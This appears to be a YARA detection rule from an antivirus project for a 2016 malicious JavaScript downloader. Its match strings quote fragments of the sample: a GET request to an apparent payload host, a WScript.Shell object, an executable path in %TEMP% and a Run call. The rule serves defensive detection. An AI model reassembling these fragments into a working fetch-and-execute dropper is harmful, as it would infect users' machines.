rule sig_20160330_44e7cb04cd58943207b75211aed87394 {
  meta:
    description = "datamaliciousorder - file 20160330_44e7cb04cd58943207b75211aed87394.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3889f5ef9bc68013ef159ea9c57802fac54f2afcf27b3df6ec40264b048e1a0f"

  strings:
    $s1  = "U0[J](\"GET\", \"http://ekotrade.pl/m4ujda\", false);" fullword ascii
    $s2  = "function XR(F, TO){RY = RY * 1; return F - TO;};" fullword ascii
    $s3  = "var HA = function PS() {return WScript[J0](\"WScript\"+\".Shell\");}(), RI = 11;" fullword ascii
    $s4  = "if (U0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function CD() {return HA[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ZN40B64DoGQ.ex\" + \"e\";};" fullword ascii
    $s6  = "function EL(){return DW + \"\";};" fullword ascii
    $s7  = "function VP() {return ((W == true) && (W == M0)) ? 1 : RY;};" fullword ascii
    $s8  = "function DS(A){HA[\"Run\"](A, RY, RY);};" fullword ascii
    $s9  = "function X()" fullword ascii
    $s10 = "var B = new this[\"Date\"]();" fullword ascii
    $s11 = "function WK(D) {var R = (1, 2, 3, 4, 5, D); return R;};" fullword ascii
    $s12 = "function GR(){return 22;};" fullword ascii
    $s13 = "}while (SI);" fullword ascii
    $s14 = "function UQ(){return J0;};" fullword ascii
    $s15 = "return XR(L, M);" fullword ascii
    $s16 = "var W = false;" fullword ascii
    $s17 = "W = true; " fullword ascii
    $s18 = "M0 = true; " fullword ascii
    $s19 = "var M0 = false;" fullword ascii
    $s20 = "var RN = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}